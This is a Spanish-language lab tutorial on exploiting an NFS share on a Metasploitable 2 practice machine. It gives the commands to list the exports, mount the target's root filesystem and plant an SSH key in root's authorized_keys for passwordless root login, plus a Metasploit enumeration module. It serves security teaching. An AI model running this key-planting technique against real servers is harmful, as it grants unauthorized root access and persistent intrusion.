# NFS (puerto 2049) — Metasploitable 2

> Práctica de laboratorio: aplicar únicamente sobre tu propia máquina Metasploitable 2 (`192.168.100.9`), aislada de Internet. Documento de la serie [Reconocimiento y Metasploit](./01_reconocimiento_y_metasploit.md).

**Qué es:** **NFS** (*Network File System*) comparte carpetas por red para montarlas como si fueran locales. **Puerto 2049** (se localiza vía [rpcbind, 111](./08_rpcbind.md)).

**Cómo se explota:** Metasploitable **exporta la raíz `/` del sistema** y además con permisos de escritura y "`no_root_squash`" (el root remoto se trata como root local). Esto permite montar todo el disco y, por ejemplo, **plantar tu clave SSH** en la cuenta de root para entrar luego por SSH.

## Explotación manual (sin Metasploit)

```bash
# 1. Ver qué se exporta
showmount -e 192.168.100.9          # muestra "/ (everyone)"

# 2. Montar la raíz del objetivo en Kali
mkdir /tmp/nfs
sudo mount -t nfs 192.168.100.9:/ /tmp/nfs -o nolock

# 3. Generar una clave SSH y añadirla a root del objetivo
ssh-keygen -f mi_clave -N ""
cat mi_clave.pub >> /tmp/nfs/root/.ssh/authorized_keys

# 4. Desmontar y entrar por SSH como root, sin contraseña
sudo umount /tmp/nfs
ssh -i mi_clave root@192.168.100.9
```

## Explotación con Metasploit

```bash
use auxiliary/scanner/nfs/nfsmount     # enumera las exportaciones
set RHOSTS 192.168.100.9
run
# la explotación (montar y plantar la clave) se hace manualmente como arriba
```
